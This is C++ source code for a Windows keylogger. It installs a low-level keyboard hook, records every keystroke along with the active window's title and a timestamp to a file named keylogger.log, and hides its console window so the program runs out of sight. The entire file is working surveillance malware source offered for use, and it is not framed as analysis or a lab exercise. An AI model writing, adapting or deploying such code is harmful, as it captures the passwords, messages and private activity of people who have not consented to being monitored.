#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

// Configuration settings
#define INVISIBLE  
#define BOOTWAIT   
#define FORMAT 0   
#define MOUSEIGNORE 

// Global variables
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream output_file;

// Extended key mappings
#if FORMAT == 0
const std::map<int, std::string> keyname{
    // Special keys
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},

    // Numbers and numpad
    {0x30, "0"}, {VK_NUMPAD0, "0"},
    {0x31, "1"}, {VK_NUMPAD1, "1"},
    {0x32, "2"}, {VK_NUMPAD2, "2"},
    {0x33, "3"}, {VK_NUMPAD3, "3"},
    {0x34, "4"}, {VK_NUMPAD4, "4"},
    {0x35, "5"}, {VK_NUMPAD5, "5"},
    {0x36, "6"}, {VK_NUMPAD6, "6"},
    {0x37, "7"}, {VK_NUMPAD7, "7"},
    {0x38, "8"}, {VK_NUMPAD8, "8"},
    {0x39, "9"}, {VK_NUMPAD9, "9"},

    // Symbols and punctuation
    {VK_OEM_PERIOD, "."}, {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"}, {VK_ADD, "+"},
    {VK_OEM_MINUS, "-"}, {VK_SUBTRACT, "-"},
    {VK_OEM_COMMA, ","},
    {VK_OEM_1, ";"},
    {VK_OEM_2, "/"},
    {VK_OEM_3, "`"},
    {VK_OEM_4, "["},
    {VK_OEM_5, "\\"},
    {VK_OEM_6, "]"},
    {VK_OEM_7, "'"},

    // Function keys
    {VK_F1, "[F1]"},
    {VK_F2, "[F2]"},
    {VK_F3, "[F3]"},
    {VK_F4, "[F4]"},
    {VK_F5, "[F5]"},
    {VK_F6, "[F6]"},
    {VK_F7, "[F7]"},
    {VK_F8, "[F8]"},
    {VK_F9, "[F9]"},
    {VK_F10, "[F10]"},
    {VK_F11, "[F11]"},
    {VK_F12, "[F12]"},

    // Additional control keys
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_NUMLOCK, "[NUMLOCK]"},
    {VK_SCROLL, "[SCROLLLOCK]"},
    {VK_SNAPSHOT, "[PRINTSCREEN]"},
    {VK_PAUSE, "[PAUSE]"},
    {VK_INSERT, "[INSERT]"},
    {VK_DELETE, "[DELETE]"},

    // Mathematical operations
    {VK_MULTIPLY, "*"},
    {VK_DIVIDE, "/"}
};
#endif

// Function prototypes
void SetHook();
void ReleaseHook();
void Stealth();
bool IsSystemBooting();
int Save(int key_stroke);
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";

#ifndef MOUSEIGNORE
    if (key_stroke == 1 || key_stroke == 2) {
        return 0;
    }
#endif

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground) {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char window_title[256];
        GetWindowTextA(foreground, window_title, 256);

        if (strcmp(window_title, lastwindow) != 0) {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);
            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

    bool shift_pressed = (GetKeyState(VK_SHIFT) & 0x1000) ||
        (GetKeyState(VK_LSHIFT) & 0x1000) ||
        (GetKeyState(VK_RSHIFT) & 0x1000);

    // Handle normal keys and shift combinations
    if (keyname.find(key_stroke) != keyname.end()) {
        if (shift_pressed && key_stroke >= 0x30 && key_stroke <= 0x39) {
            // Handle shift + number combinations
            switch (key_stroke) {
            case 0x30: output << ")"; break;
            case 0x31: output << "!"; break;
            case 0x32: output << "@"; break;
            case 0x33: output << "#"; break;
            case 0x34: output << "$"; break;
            case 0x35: output << "%"; break;
            case 0x36: output << "^"; break;
            case 0x37: output << "&"; break;
            case 0x38: output << "*"; break;
            case 0x39: output << "("; break;
            default: output << keyname.at(key_stroke);
            }
        }
        else {
            output << keyname.at(key_stroke);
        }
    }
    else {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if (shift_pressed) {
            lowercase = !lowercase;
        }

        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        if (!lowercase) {
            key = tolower(key);
        }
        output << char(key);
    }

    output_file << output.str();
    output_file.flush();
    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef INVISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int main()
{
    Stealth();

#ifdef BOOTWAIT
    while (IsSystemBooting()) {
        std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
        Sleep(10000);
    }
#endif

#ifdef NOWAIT
    std::cout << "Skipping boot metrics check.\n";
#endif

    const char* output_filename = "keylogger.log";
    std::cout << "Logging output to " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    return 0;
}